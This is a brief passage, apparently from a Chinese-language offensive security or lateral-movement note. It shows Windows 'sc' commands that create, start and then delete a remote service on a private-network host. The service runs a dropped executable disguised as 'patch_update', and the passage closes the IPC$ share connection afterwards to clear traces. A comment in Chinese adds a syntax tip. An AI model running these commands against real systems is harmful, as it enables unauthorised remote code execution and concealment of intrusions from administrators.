...
# sc \\192.168.3.168 create "patch_update" binpath= "cmd /c c:\windows\temp\plugin_update.exe"  这里注意下等号后面的空格别漏了
# sc \\192.168.3.168 start "patch_update"
# sc \\192.168.3.168 delete "patch_update"
# net use \\192.168.3.168\ipc$ /del
```
